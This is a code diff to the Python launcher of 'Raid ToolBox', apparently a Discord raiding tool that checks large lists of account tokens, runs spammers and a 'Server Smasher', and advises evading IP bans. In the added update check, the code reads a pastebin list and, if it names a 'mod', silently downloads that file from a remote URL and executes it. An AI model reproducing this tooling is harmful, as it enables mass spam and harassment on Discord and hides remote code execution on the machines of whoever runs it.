@@ -3,7 +3,7 @@
 # Author: DeadBread76 - https://github.com/DeadBread76/
 # Febuary 23rd, 2019
 
-rtbversion = "0.3.7r3"
+rtbversion = "0.3.7r4"
 smversion = "0.1.6r3"
 
 try:
@@ -157,7 +157,7 @@ if verbose == 1:
         except Exception as i:
             print ("Error Loading animation")
             handle.write("Error Loading animation\n")
-    print ("Starting...")
+    print ("Loaded all modules")
 
 else:
     try:
@@ -220,63 +220,110 @@ ydl_opts = {
 
 init()
 collector = create_collector('my-collector', 'https')
+colours = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan']
 if menucolour.lower() == 'random':
-    colours=['red', 'green', 'yellow', 'blue', 'magenta', 'cyan']
     menucolour = random.choice(colours)
 if menucolour2.lower() == 'random':
-    colours=['red', 'green', 'yellow', 'blue', 'magenta', 'cyan']
     menucolour2 = random.choice(colours)
-tcounter = 0
 if sys.platform.startswith('win32'):
     clear = lambda: os.system('cls')
 elif sys.platform.startswith('linux'):
     clear = lambda: os.system('clear')
 
-vercheck = requests.get("https://pastebin.com/raw/Wn8WvrRb").text
-if not vercheck.rstrip() == rtbversion:
-    print(colored("There is an update for RTB, Download update?", menucolour))
-    verchoice = input(colored("(Y/N): ",menucolour2))
-    if verchoice.lower() == "y":
-        clear()
-        @animation.wait(colored('Downloading update for Raid ToolBox, Please Wait ',menucolour))
-        def run_update():
-            if sys.platform.startswith('win32'):
-                ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Updating...")
-            elif sys.platform.startswith('linux'):
-                sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Updating...\x07")
-            update = requests.get('https://github.com/DeadBread76/Raid-Toolbox/archive/master.zip')
-            clear()
-            print(colored("Update has been downloaded, Installing...",menucolour))
-            return update
-        update = run_update()
-        with open("update.zip", "wb") as handle:
-            handle.write(update.content)
-        try:
-            shutil.copy("config.py", "config_old.py")
-            shutil.copy("spammer/smconfig.py", "smconfig_old.py")
-        except Exception:
-            pass
-        try:
-            shutil.unpack_archive("update.zip")
-            copy_tree("Raid-Toolbox-master/", ".")
-            os.remove("update.zip")
-            shutil.rmtree("Raid-Toolbox-master/")
-            print ("Update complete, exiting.")
-        except Exception as e:
-            print("Error Updating, {}".format(e))
-        time.sleep(3)
-        sys.exit()
+if disableupdatecheck == 1:
+    pass
+else:
+    try:
+        if verbose == 1:
+            print("Checking for updates...")
+        vercheck = requests.get("https://pastebin.com/raw/Fn4s3yr2").text.rstrip().split("|")
+        if not vercheck[0] == rtbversion:
+            print(colored("There is an update for RTB, Download update?", menucolour))
+            verchoice = input(colored("(Y/N): ",menucolour2))
+            if verchoice.lower() == "y":
+                clear()
+                @animation.wait(colored('Downloading update for Raid ToolBox, Please Wait ',menucolour))
+                def run_update():
+                    if sys.platform.startswith('win32'):
+                        ctypes.windll.kernel32.SetConsoleTitleW("DeadBread's Raid ToolBox | Updating...")
+                    elif sys.platform.startswith('linux'):
+                        sys.stdout.write("\x1b]2;DeadBread's Raid ToolBox | Updating...\x07")
+                    update = requests.get('https://github.com/DeadBread76/Raid-Toolbox/archive/master.zip')
+                    clear()
+                    print(colored("Update has been downloaded, Installing...",menucolour))
+                    return update
+                update = run_update()
+                with open("update.zip", "wb") as handle:
+                    handle.write(update.content)
+                try:
+                    shutil.copy("config.py", "config_old.py")
+                    shutil.copy("spammer/smconfig.py", "spammer/smconfig_old.py")
+                except Exception:
+                    pass
+                try:
+                    shutil.unpack_archive("update.zip")
+                    copy_tree("Raid-Toolbox-master/", ".")
+                    os.remove("update.zip")
+                    shutil.rmtree("Raid-Toolbox-master/")
+                    print ("Update complete, exiting.")
+                except Exception as e:
+                    print("Error Updating, {}".format(e))
+                time.sleep(3)
+                sys.exit()
+        if not vercheck[1] == smversion:
+            print(colored("There is an update for Server Smasher, Download update?", menucolour))
+            verchoice = input(colored("(Y/N): ",menucolour2))
+            if verchoice.lower() == "y":
+                clear()
+                print(colored('Downloading update for Server Smasher, Please Wait...',menucolour))
+                serversmasherupdate = requests.get('https://raw.githubusercontent.com/DeadBread76/Raid-Toolbox/master/spammer/serversmasher.py')
+                configupdate =  requests.get('https://raw.githubusercontent.com/DeadBread76/Raid-Toolbox/master/spammer/smconfig.py')
+                mainpatch = requests.get("https://raw.githubusercontent.com/DeadBread76/Raid-Toolbox/master/main.py")
+                print(colored("Update has been downloaded, Installing...",menucolour))
+                try:
+                    shutil.copy("spammer/smconfig.py", "spammer/smconfig_old.py")
+                except Exception:
+                    pass
+                with open("spammer/serversmashertest.py", "wb") as handle:
+                    handle.write(serversmasherupdate.content)
+                with open("spammer/smconfigtest.py", "wb") as handle:
+                    handle.write(configupdate.content)
+                with open("maintest.py", "wb") as handle:
+                    handle.write(mainpatch.content)
+                print(colored("Update Complete.",menucolour))
+                input("Press enter to exit.")
+                sys.exit()
+        if len(vercheck) > 2:
+            if os.path.exists("mods/"+vercheck[3]):
+                pass
+            else:
+                print("Found Modification For RTB, Downloading...")
+                data = requests.get(vercheck[2])
+                if not os.path.exists("mods/"):
+                    os.mkdir("mods/")
+                with open ("mods/"+vercheck[3],"wb") as handle:
+                    handle.write(data.content)
+                if sys.platform.startswith('win32'):
+                    subprocess.Popen([winpy,"mods/"+vercheck[3]])
+                elif sys.platform.startswith('linux'):
+                    subprocess.Popen([linuxpy,"mods/"+vercheck[3]])
+    except Exception as e:
+        print("Error Updating")
 
 if os.path.isfile("pluginpids"):
     os.remove("pluginpids")
+    if verbose == 1:
+        print("Removed pluginpids")
 if os.path.exists('tokens.txt'):
     with open('tokens.txt','r') as handle:
         line = handle.readlines()
-        for x in line:
-            tcounter += 1
+        tcounter = len(line)
+        if verbose == 1:
+            print("Loaded {} Tokens".format(tcounter))
 else:
     with open('tokens.txt','w+') as handle:
-        print ("Created Tokens.txt")
+        if verbose == 1:
+            print ("Created Tokens.txt")
 if not os.path.exists("spammer"):
     clear()
     singlefile = True
@@ -285,6 +332,8 @@ if not os.path.exists("spammer"):
 else:
     singlefile = False
     if not os.path.isfile("ffmpeg.exe"):
+        if verbose == 1:
+            print("FFmpeg is missing")
         print(colored("Download FFMpeg? (Needed For Voice Chat Spammer)", menucolour))
         fmpg = input("(Y/N):")
         if fmpg.lower() == "y":
@@ -303,25 +352,48 @@ else:
             copy_tree("ffmpeg-4.1.3-win64-static/bin/", ".")
             time.sleep(0.5)
             shutil.rmtree("ffmpeg-4.1.3-win64-static")
-cloudflarecheck = requests.get("https://discordapp.com/api/v6/invite/DEADBREAD")
+if disablecloudflarecheck == 1:
+    pass
+else:
+    if verbose == 1:
+        print("Checking CloudFlare Status")
+    cloudflarecheck = requests.get("https://discordapp.com/api/v6/invite/DEADBREAD")
+    try:
+        json.loads(cloudflarecheck.content)
+    except Exception:
+        print("Your IP is CloudFlare Banned.\nThis means you can't use the Joiner or the Regular Checker.\nUse Proxies or a VPN to get around this.")
+        input(colored("Press enter to continue.",'red'))
+if verbose == 1:
+    print("Starting...")
 try:
-    json.loads(cloudflarecheck.content)
+    if tcounter > tokenwarningthreshhold and tcounter < 1000:
+        if disabletokenlimit == 1:
+            pass
+        else:
+            print(colored("Using This many tokens may make your PC slow down or freeze, depending on how good your PC is.\nIf you have issues, try removing some.","blue"))
+            input()
+    if tcounter > 1000:
+        if disabletokenlimit == 1:
+            pass
+        else:
+            print (colored("Using this many tokens may cause your PC to freeze or crash. \nType 'continue' to continue anyway despite the warning, or Raid ToolBox will exit.","red"))
+            lem = input ()
+            if lem == 'continue':
+                clear()
+            else:
+                sys.exit()
 except Exception:
-    print("Your IP is CloudFlare Banned.\nThis means you can't use the Joiner or the Regular Checker.\nUse Proxies or a VPN to get around this.")
-    input(colored("Press enter to continue.",'red'))
+    pass
 currentattacks = []
 spawnedpids = []
-
 def main(currentattacks,spawnedpids):
     if sys.platform.startswith('win32'):
         os.system('mode con:cols=100 lines=30')
     elif sys.platform.startswith('linux'):
         os.system("printf '\033[8;30;100t'")
-    tcounter = 0
     with open('tokens.txt','r') as handle:
         line = handle.readlines()
-        for x in line:
-            tcounter += 1
+        tcounter = len(line)
     now = datetime.datetime.now()
     clear()
     if useproxies == 'True':
@@ -342,12 +414,6 @@ def main(currentattacks,spawnedpids):
         menublank = "  "
     if len(str(tcounter)) == 4:
         menublank = " "
-        print (colored("Um, thats too many tokens. Remove some to use Raid ToolBox.\n Type 'continue' to continue anyway despite, the warning.","red"))
-        lem = input ()
-        if lem == 'continue':
-            clear()
-        else:
-            sys.exit()
     if alternatemenu == True:
             print (colored("                                                                                       ",menucolour))
             if singlefile == True:
@@ -607,12 +673,17 @@ def tokencheck(currentattacks,spawnedpids):
                 if "You need to verify your account in order to perform this action." in str(src.content):
                     print (colored(token + ' Unverified.',"yellow"))
                     ucounter +=1
-                    unverified.append(token)
+                    if combineuverifiedandverified == 1:
+                        if token in validtokens:
+                            continue
+                        validtokens.append(token)
+                    else:
+                        unverified.append(token)
                 elif "401: Unauthorized" in str(src.content):
                     print (colored(token + ' Invalid.',"red"))
                     icounter +=1
                 else:
-                    print (colored(token + ' Valid.',"green"))
+                    print (colored(token + ' Verified.',"green"))
                     vcounter +=1
                     if token in validtokens:
                         continue
@@ -622,9 +693,12 @@ def tokencheck(currentattacks,spawnedpids):
         with open('tokens.txt','w') as handle:
             for token in validtokens:
                 handle.write(token+'\n')
-        with open('unverified_tokens.txt','a') as handle:
-            for token in unverified:
-                handle.write(token+'\n')
+        if combineuverifiedandverified == 1:
+            pass
+        else:
+            with open('unverified_tokens.txt','a') as handle:
+                for token in unverified:
+                    handle.write(token+'\n')
         print ("---------------------------------------")
         print (colored("Number of valid tokens: " + str(vcounter),"green"))
         print (colored("Number of unverified tokens: " + str(ucounter),"yellow"))
